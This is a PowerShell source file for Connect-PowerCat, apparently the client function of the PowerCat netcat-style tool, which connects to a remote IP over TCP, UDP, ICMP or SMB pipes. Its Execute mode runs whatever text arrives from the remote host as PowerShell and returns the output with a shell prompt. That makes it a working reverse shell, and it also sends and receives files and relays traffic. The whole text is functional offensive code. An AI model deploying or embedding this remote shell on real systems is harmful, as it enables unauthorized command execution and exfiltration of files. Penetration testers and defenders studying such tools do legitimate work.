function Connect-PowerCat {
[CmdletBinding(DefaultParameterSetName = 'Console')]
    Param (
        [Parameter(Position = 0, Mandatory = $true)]
        [Alias('m')]
        [ValidateSet('Icmp', 'Smb', 'Tcp', 'Udp')]
        [String]$Mode,

        [Parameter(Position = 1, Mandatory = $true)]
        [ValidatePattern("^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$")]
        [Alias('c')]
        [String]$RemoteIp,
        
        [Parameter(ParameterSetName = 'Execute')]
        [Alias('e')]
        [Switch]$Execute,
        
        [Parameter(ParameterSetName = 'Relay')]
        [Alias('r')]
        [String]$Relay,

        [Parameter(ParameterSetName = 'ReceiveFile')]
        [Alias('rf')]
        [String]$ReceiveFile,
    
        [Parameter(ParameterSetName = 'SendFile')]
        [Alias('sf')]
        [String]$SendFile,
    
        [Parameter()]
        [Alias('d')]
        [Switch]$Disconnect,
    
        [Parameter()]
        [Alias('k')]
        [Switch]$KeepAlive,
    
        [Parameter()]
        [Alias('t')]
        [Int]$Timeout = 60,
        
        [Parameter()]
        [ValidateSet('Ascii','Unicode','UTF7','UTF8','UTF32')]
        [String]$Encoding = 'Ascii'
    )       
    DynamicParam {
        $ParameterDictionary = New-Object Management.Automation.RuntimeDefinedParameterDictionary
        
        switch ($Mode) {
           'Icmp' { $BindParam = New-RuntimeParameter -Name BindAddress -Type String -Mandatory -Position 1 -ParameterDictionary $ParameterDictionary -ValidatePattern "^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$" ; continue }
            'Smb' { $PipeNameParam = New-RuntimeParameter -Name PipeName -Type String -Mandatory -ParameterDictionary $ParameterDictionary ; continue }
            'Tcp' { $PortParam = New-RuntimeParameter -Name Port -Type Int -Mandatory -Position 1 -ParameterDictionary $ParameterDictionary ; continue }
            'Udp' { $PortParam = New-RuntimeParameter -Name Port -Type Int -Mandatory -Position 1 -ParameterDictionary $ParameterDictionary ; continue }
        }

        if ($Execute.IsPresent) { 
            $ScriptBlockParam = New-RuntimeParameter -Name ScriptBlock -Type ScriptBlock -ParameterDictionary $ParameterDictionary 
            $ArgumentListParam = New-RuntimeParameter -Name ArgumentList -Type Object[] -ParameterDictionary $ParameterDictionary 
        }

        return $ParameterDictionary
    }
    Begin {     
        Write-Verbose "Setting up network stream..."

        $ServerIp = [Net.IPAddress]::Parse($RemoteIp)

        switch ($Mode) {
           'Icmp' { 
                try { $InitialBytes, $ClientStream = New-IcmpStream $ServerIp $ParameterDictionary.BindAddress.Value }
                catch { Write-Warning "Failed to open Icmp stream. $($_.Exception.Message)" ; return }
                continue 
            }
            'Smb' { 
                try { $ClientStream = New-SmbStream $RemoteIp $ParameterDictionary.PipeName.Value  }
                catch { Write-Warning "Failed to open Smb stream. $($_.Exception.Message)" ; return }
                continue 
            }
            'Tcp' { 
                try { $ClientStream = New-TcpStream $ServerIp $ParameterDictionary.Port.Value }
                catch { Write-Warning "Failed to open Tcp stream. $($_.Exception.Message)" ; return }
                continue 
            }
            'Udp' { 
                try { $InitialBytes, $ClientStream = New-UdpStream $ServerIp $ParameterDictionary.Port.Value }
                catch { Write-Warning "Failed to open Udp stream. $($_.Exception.Message)" ; return }
            }
        }
            
        switch ($Encoding) {
            'Ascii' { $EncodingType = New-Object Text.AsciiEncoding ; continue }
          'Unicode' { $EncodingType = New-Object Text.UnicodeEncoding ; continue }
             'UTF7' { $EncodingType = New-Object Text.UTF7Encoding ; continue }
             'UTF8' { $EncodingType = New-Object Text.UTF8Encoding ; continue }
            'UTF32' { $EncodingType = New-Object Text.UTF32Encoding ; continue }
        }
      
        if ($PSCmdlet.ParameterSetName -eq 'SendFile') {   
            
            Write-Verbose 'Reading file bytes...'

            if ((Test-Path $SendFile)) { 
                $FileSize = (Get-Item $SendFile).Length

                $FileStream = New-Object IO.FileStream -ArgumentList @($SendFile, [IO.FileMode]::Open)
                $BytesLeft = $FileStream.Length
                $FileOffset = 0

                if ($FileStream.Length -gt 65536) {
                    $BytesToSend = New-Object Byte[] 65536
                    do {
                        [void]$FileStream.Seek($FileOffset, [IO.SeekOrigin]::Begin)
                        [void]$FileStream.Read($BytesToSend, 0, $BytesToSend.Length)
                        $FileOffset += $BytesToSend.Length
                        $BytesLeft -= $BytesToSend.Length
                        Write-NetworkStream $Mode $ClientStream $BytesToSend
                    } while ($BytesLeft -gt $BytesToSend.Length)
                    $BytesToSend = New-Object Byte[] $BytesLeft
                    $FileStream.Seek($FileOffset, [IO.SeekOrigin]::Begin)
                    $FileStream.Read($BytesToSend, 0, $BytesLeft)
                    Write-NetworkStream $Mode $ClientStream $BytesToSend
                }
                else {
                    try { $BytesToSend = [IO.File]::ReadAllBytes($SendFile) } 
                    catch { Write-Warning $_.Exception.Message }
                    Write-NetworkStream $Mode $ClientStream $BytesToSend
                }
            }
            else { Write-Warning "$SendFile does not exist." }
        }

        elseif ($PSCmdlet.ParameterSetName -eq 'Relay') {
            
            Write-Verbose "Setting up relay stream..."

            $RelayConfig = $Relay.Split(':')

            if ($RelayConfig.Count -eq 2) { # Listener
                
                $RelayMode = $RelayConfig[0].ToLower()

                switch ($RelayMode) {
                   'icmp' { $RelayStream = New-IcmpStream -Listener $RelayConfig[1] ; continue }
                    'smb' { $RelayStream = New-SmbStream -Listener $RelayConfig[1] ; continue }
                    'tcp' { $RelayStream = New-TcpStream -Listener $RelayConfig[1] ; continue }
                    'udp' { $RelayStream = New-UdpStream -Listener $RelayConfig[1] ; continue }
                    default { Write-Warning 'Invalid relay mode specified.' ; return }
                }
            }
            elseif ($RelayConfig.Count -eq 3) { # Client
                
                $RelayMode = $RelayConfig[0].ToLower()
                $ServerIp = [Net.IPAddress]::Parse($RemoteIp)

                switch ($RelayMode) {
                   'icmp' { $RelayStream = New-IcmpStream $ServerIp $RelayConfig[2] ; continue }
                    'smb' { $RelayStream = New-SmbStream $RelayConfig[1] $RelayConfig[2] ; continue }
                    'tcp' { $RelayStream = New-TcpStream $ServerIp $RelayConfig[2] ; continue }
                    'udp' { $RelayStream = New-UdpStream $ServerIp $RelayConfig[2] ; continue }
                    default { Write-Warning 'Invalid relay mode specified.' ; return }
                }
            }
            else { Write-Error 'Invalid relay format.' -ErrorAction Stop }
        }
          
        elseif ($ParameterDictionary.ScriptBlock.Value) {
            
            Write-Verbose 'Executing scriptblock...'

            $ScriptBlock = $ParameterDictionary.ScriptBlock.Value
            
            $Error.Clear()
            
            $BytesToSend += $EncodingType.GetBytes(($ScriptBlock.Invoke($ParameterDictionary.ArgumentList.Value) | Out-String))
            if ($Error) { foreach ($Err in $Error) { $BytesToSend += $EncodingType.GetBytes($Err.ToString()) } }
            $BytesToSend += $EncodingType.GetBytes(("`nPS $((Get-Location).Path)> "))
            
            Write-NetworkStream $Mode $ClientStream $BytesToSend
            $ScriptBlock = $null
            $BytesToSend = $null
        }
    }
    Process {             
        [console]::TreatControlCAsInput = $true

        while ($true) {
        
            if ($PSCmdlet.ParameterSetName -eq 'SendFile') { Write-Verbose "$SendFile sent." ; break }
            if ($Disconnect.IsPresent) { Write-Verbose 'Disconnect specified, exiting.' ; break }
            
            # Catch Esc / Read-Host
            if ([console]::KeyAvailable) {          
                $Key = [console]::ReadKey()
                if ($Key.Key -eq [Consolekey]::Escape) {
                    Write-Warning 'Caught escape sequence, stopping PowerCat.'
                    break
                }
                if ($PSCmdlet.ParameterSetName -eq 'Console') { 
                    $BytesToSend = $EncodingType.GetBytes($Key.KeyChar + (Read-Host) + "`n") 
                    Write-NetworkStream $Mode $ClientStream $BytesToSend
                }
            }

            # Get data from the network
            if ($InitialBytes) { $ReceivedBytes = $InitialBytes ; $InitialBytes = $null }
            elseif ($ClientStream.Socket.Connected) { 
                if ($ClientStream.Read.IsCompleted) { $ReceivedBytes = Read-NetworkStream $Mode $ClientStream $ClientStream.Socket.Available } 
                else { Start-Sleep -Milliseconds 1 ; continue }
            }
            elseif ($ClientStream.Pipe.IsConnected) { 
                if ($ClientStream.Read.IsCompleted) { $ReceivedBytes = Read-NetworkStream $Mode $ClientStream } 
                else { Start-Sleep -Milliseconds 1 ; continue }
            }
            else { Write-Warning 'Connection broken, exiting.' ; break }

            # Redirect received bytes
            if ($PSCmdlet.ParameterSetName -eq 'Execute') {
            
                $ScriptBlock = [ScriptBlock]::Create($EncodingType.GetString($ReceivedBytes))
            
                $Global:Error.Clear()
                
                $BytesToSend += $EncodingType.GetBytes(($ScriptBlock.Invoke() | Out-String))
                foreach ($Err in $Global:Error) { $BytesToSend += $EncodingType.GetBytes($Err.Exception.Message) }
                $BytesToSend += $EncodingType.GetBytes(("`nPS $((Get-Location).Path)> "))
                
                Write-NetworkStream $Mode $ClientStream $BytesToSend 
                $BytesToSend = $null
                $ScriptBlock = $null
                continue
            }
            elseif ($PSCmdlet.ParameterSetName -eq 'Relay') { Write-NetworkStream $RelayMode $RelayStream $ReceivedBytes ; continue }
            elseif ($PSCmdlet.ParameterSetName -eq 'ReceiveFile') { 
                $FileStream = New-Object IO.FileStream -ArgumentList @($ReceiveFile, [IO.FileMode]::Append)
                [void]$FileStream.Seek(0, [IO.SeekOrigin]::End) 
                $FileStream.Write($ReceivedBytes, 0, $ReceivedBytes.Length) 
                $FileStream.Flush() 
                $FileStream.Dispose() 
                break
            }
            else { Write-Host -NoNewline $EncodingType.GetString($ReceivedBytes).TrimEnd("`r") }
        }
    }
    End {   
        [console]::TreatControlCAsInput = $false
        Write-Verbose 'Attempting to close network stream.'
      
        try { Close-NetworkStream $Mode $ClientStream }
        catch { Write-Warning "Failed to close client stream. $($_.Exception.Message)" }

        if ($PSCmdlet.ParameterSetName -eq 'Relay') {
            try { Close-NetworkStream $RelayMode $RelayStream }
            catch { Write-Warning "Failed to close relay stream. $($_.Exception.Message)" }
        }
    }
}